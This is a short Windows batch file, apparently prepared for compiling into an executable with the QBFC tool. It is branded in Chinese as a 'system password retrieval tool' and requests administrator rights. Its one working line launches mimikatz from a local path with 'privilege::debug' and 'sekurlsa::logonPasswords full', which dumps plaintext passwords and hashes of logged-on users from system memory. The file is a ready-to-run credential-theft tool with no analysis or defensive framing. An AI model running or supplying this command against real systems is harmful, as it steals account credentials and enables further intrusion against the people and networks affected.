@ECHO OFF
REM  QBFC Project Options Begin
REM  HasVersionInfo: Yes
REM  Companyname: 小站制作
REM  Productname: 小站制作系统密码获取工具
REM  Filedescription: 系统密码获取工具
REM  Copyrights: 小站
REM  Trademarks: 小站
REM  Originalname: 小站系统密码获取工具
REM  Comments: 小站系统密码获取工具
REM  Productversion: 10.10.10.10
REM  Fileversion: 10.10.10.10
REM  Internalname: 
REM  Appicon: L:\工具\QQ\3D风格ICO图标\paint2.ico
REM  AdministratorManifest: Yes
REM  QBFC Project Options End
ECHO ON
@echo off
C:\Users\chtyfox\Desktop\Win32\mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords full"
Pause



